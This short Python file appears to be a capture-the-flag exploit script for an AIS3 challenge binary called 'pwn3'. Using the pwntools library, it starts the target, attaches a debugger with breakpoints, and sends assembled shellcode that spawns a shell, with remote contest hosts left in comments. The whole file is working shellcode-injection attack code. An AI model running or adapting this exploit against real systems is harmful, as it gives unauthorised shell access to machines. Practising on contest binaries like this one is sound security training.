from pwn import *

context.arch = 'amd64'
context.bits = 64
context.os = 'linux'

p = process('pwn3')
#p = remote('quiz.ais3.org', 9563)
#p = remote('0.0.0.0', 4000)

gdb.attach(p, '''b *0x400f58
                 b *0x400f7b
                 b *0x601a4e''')
p.recvuntil('):')
p.sendline(asm(shellcraft.trap()+shellcraft.sh()))

p.interactive()
p.close()
